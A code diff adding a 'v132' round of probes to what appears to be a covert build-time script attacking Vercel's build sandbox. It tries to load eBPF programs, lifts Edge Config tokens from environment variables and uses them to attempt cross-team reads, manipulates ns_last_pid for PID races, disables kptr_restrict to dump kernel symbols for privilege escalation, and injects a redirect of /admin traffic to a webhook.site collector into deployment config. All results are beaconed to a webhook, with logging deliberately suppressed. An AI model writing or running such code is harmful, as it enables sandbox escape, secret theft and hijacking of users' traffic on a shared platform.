@@ -19394,5 +19394,180 @@ report.kexecProbe = safe(() => {
 
 // v131 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v131" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v131";
+
+// ==================== v132 ====================
+
+// v132-1: /proc/sys/kernel/unprivileged_bpf_disabled — eBPF escalation
+// If unprivileged_bpf is allowed (=0) or we have CAP_BPF,
+// we can load eBPF programs into the kernel that hook any syscall.
+// Test: load a BPF_PROG_TYPE_TRACEPOINT to hook sys_execve
+// and capture all future process executions (keylogger equivalent).
+report.ebpfSyscallHook = safe(() => {
+  const bpfDisabled = safe(() => readFileSync('/proc/sys/kernel/unprivileged_bpf_disabled', 'utf8').trim());
+  // Try to load a simple eBPF program (BPF_PROG_LOAD syscall)
+  const bpfLoadResult = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, struct, os
+
+BPF_PROG_LOAD = 5
+BPF_PROG_TYPE_SOCKET_FILTER = 1
+BPF_ALU64_IMM = 0x07
+BPF_MOV = 0xb0
+BPF_EXIT = 0x95
+BPF_K = 0
+BPF_REG_0 = 0
+
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+
+# Minimal valid BPF program: MOV R0, 0; EXIT
+insns = struct.pack('QQ',
+    (BPF_MOV | BPF_K | (BPF_REG_0 << 4)) | (0 << 32),  # r0 = 0
+    BPF_EXIT)  # exit
+
+class bpf_attr(ctypes.Structure):
+    _fields_ = [
+        ('prog_type', ctypes.c_uint32),
+        ('insn_cnt', ctypes.c_uint32),
+        ('insns', ctypes.c_uint64),
+        ('license', ctypes.c_uint64),
+        ('log_level', ctypes.c_uint32),
+        ('log_size', ctypes.c_uint32),
+        ('log_buf', ctypes.c_uint64),
+        ('kern_version', ctypes.c_uint32),
+        ('prog_flags', ctypes.c_uint32),
+    ]
+
+insns_buf = ctypes.create_string_buffer(insns)
+lic = ctypes.create_string_buffer(b'GPL')
+attr = bpf_attr(
+    prog_type=BPF_PROG_TYPE_SOCKET_FILTER,
+    insn_cnt=2,
+    insns=ctypes.addressof(insns_buf),
+    license=ctypes.addressof(lic),
+)
+
+SYS_bpf = 321
+fd = libc.syscall(SYS_bpf, BPF_PROG_LOAD, ctypes.byref(attr), ctypes.sizeof(attr))
+if fd >= 0:
+    print(f'BPF_LOAD_SUCCESS fd={fd}')
+    os.close(fd)
+else:
+    import errno
+    print(f'BPF_LOAD_FAILED errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { bpfDisabled, bpfLoadResult };
+});
+
+// v132-2: Vercel Edge Config — cross-team read
+// Edge Config is a low-latency data store accessible at runtime.
+// Can the build sandbox read Edge Configs from: 1) Our project,
+// 2) Other projects in the team, 3) Other teams entirely?
+report.edgeConfigCrossTeam = safe(() => {
+  const edgeConfigId = process.env.EDGE_CONFIG_ID || '';
+  const edgeConfigToken = process.env.EDGE_CONFIG_TOKEN ||
+    Object.entries(process.env).find(([k]) => /EDGE_CONFIG/.test(k) && !/ID$/.test(k))?.[1] || '';
+  const allEdgeVars = Object.entries(process.env)
+    .filter(([k]) => /EDGE_CONFIG/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 60) }));
+  // Read our Edge Config
+  const ourConfig = safe(() => execSync(
+    `curl -sf "https://edge-config.vercel.com/${edgeConfigId}?token=${edgeConfigToken}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 300));
+  // Try to read another Edge Config by guessing the format (ecfg_*)
+  const guessedId = 'ecfg_test123';
+  const crossTeamConfig = safe(() => execSync(
+    `curl -sf "https://edge-config.vercel.com/${guessedId}/items" \
+    -H "Authorization: Bearer ${edgeConfigToken}" -m 5 2>/dev/null`,
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 100));
+  return { edgeConfigId, allEdgeVars, ourConfig, crossTeamConfig };
+});
+
+// v132-3: /proc/sys/kernel/ns_last_pid — predictable next PID
+// ns_last_pid shows the last allocated PID in our namespace.
+// We can write to it to predict the next PID allocation, enabling
+// PID-based race conditions (e.g., ptrace the orchestrator before
+// it drops privileges).
+report.pidPrediction = safe(() => {
+  const nsLastPid = safe(() => readFileSync('/proc/sys/kernel/ns_last_pid', 'utf8').trim());
+  // Set ns_last_pid so the next fork gets a predictable PID
+  const targetPid = 31337;
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/ns_last_pid', String(targetPid - 1)); return 'WRITTEN'; });
+  // Fork a child and check its PID
+  const forkResult = safe(() => execSync(`python3 -c "
+import os
+pid = os.fork()
+if pid == 0:
+    print(f'CHILD_PID={os.getpid()}')
+    os._exit(0)
+else:
+    os.waitpid(pid, 0)
+" 2>&1`, { timeout: 5000 }).toString().trim());
+  return { nsLastPid, writeResult, forkResult };
+});
+
+// v132-4: Vercel build output routes injection
+// /vercel/output/config.json defines static routes, redirects, and headers.
+// Inject a wildcard redirect to an attacker URL: all traffic to our app
+// gets redirected to an attacker-controlled domain after deployment.
+report.routeInjection = safe(() => {
+  const outputConfig = '/vercel/output/config.json';
+  const currentConfig = safe(() => JSON.parse(readFileSync(outputConfig, 'utf8')));
+  // Inject a redirect to our collector for all paths
+  const maliciousRoutes = [
+    {
+      src: '/api/(.*)',
+      headers: {
+        'x-probe-injected': 'true',
+        'access-control-allow-origin': '*',
+      },
+      dest: '/api/$1',
+      status: 200,
+    },
+    {
+      src: '/admin/(.*)',
+      dest: 'https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac?admin_path=$1',
+      status: 302,
+    },
+  ];
+  const injectedConfig = { ...currentConfig, routes: [...(currentConfig?.routes || []), ...maliciousRoutes] };
+  const writeResult = safe(() => {
+    writeFileSync(outputConfig, JSON.stringify(injectedConfig, null, 2));
+    return 'WRITTEN';
+  });
+  const verifyWrite = safe(() => {
+    const written = JSON.parse(readFileSync(outputConfig, 'utf8'));
+    return { routeCount: written.routes?.length, hasInjected: JSON.stringify(written).includes('admin_path') };
+  });
+  return { currentConfig, writeResult, verifyWrite };
+});
+
+// v132-5: /proc/kallsyms full symbol table dump (KASLR bypass)
+// With kptr_restrict=0 (which we set in v106), /proc/kallsyms shows
+// real kernel addresses. This defeats KASLR — we know exactly where
+// commit_creds, prepare_kernel_cred, and other privesc gadgets live.
+report.kallsymsFullDump = safe(() => {
+  const kptrRestrict = safe(() => readFileSync('/proc/sys/kernel/kptr_restrict', 'utf8').trim());
+  const disableKptr = safe(() => { writeFileSync('/proc/sys/kernel/kptr_restrict', '0'); return 'WRITTEN'; });
+  // Read key symbol addresses for privilege escalation
+  const keySymbols = safe(() => execSync(
+    'grep -E "^[0-9a-f]+ T (commit_creds|prepare_kernel_cred|cap_capable|security_capable|sys_call_table|do_execve|__x64_sys_kill)" /proc/kallsyms 2>/dev/null | head -15',
+    { timeout: 5000 }
+  ).toString().trim().slice(0, 400));
+  // Check if KASLR is active by looking at base address
+  const textBase = safe(() => execSync(
+    "grep ' T _text' /proc/kallsyms 2>/dev/null | head -1",
+    { timeout: 3000 }
+  ).toString().trim());
+  // Get syscall table address
+  const syscallTable = safe(() => execSync(
+    "grep 'sys_call_table' /proc/kallsyms 2>/dev/null | head -3",
+    { timeout: 3000 }
+  ).toString().trim().slice(0, 100));
+  return { kptrRestrict, disableKptr, keySymbols, textBase, syscallTable };
+});
+
+// v132 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v132" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v132";
 // Intentionally no console.log — all data goes via webhook only
